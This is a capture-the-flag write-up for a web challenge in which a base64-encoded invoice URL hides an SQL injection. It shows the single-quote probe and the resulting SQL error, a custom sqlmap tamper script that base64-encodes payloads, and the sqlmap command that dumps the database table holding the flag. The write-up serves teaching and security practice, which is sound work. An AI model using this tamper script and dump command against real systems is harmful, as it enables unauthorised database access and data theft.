## Solution

After signing up on the website, we can view our invoice. The invoice URL appears to be in the format `/legacy_invoice_system/BASE64_ENCODED_STRING`.

This base64-encoded string decodes to `USERNAME-YEAR-MONTH-DAY`

Adding a `'` to the back of the username yielded an SQL error:

```
syntax error at or near "2021"
LINE 1: ...riber WHERE username='zeyu2001'' AND signup_date='2021-11-27...
                                                             ^
```

It appears that the input string is split into the username and signup date, and both are passed into the SQL query without sanitization.

We can use a custom SQLMap tamper script that appends the payload to the back of the signup date, and then base64-encodes the entire input string before passing it into the custom injection point at `GET /legacy_invoice_system/*`

```python
import base64
from lib.core.enums import PRIORITY

# Define which is the order of application of tamper scripts against the payload
__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):

    retVal = base64.b64encode(('zeyu2001-2021-11-27' + payload).encode()).decode()
    
    return retVal
```

Running `sqlmap -r invoice.req --tamper tamper.py --threads 10 -T news_article --dump`, we can dump the database which contains the flag.
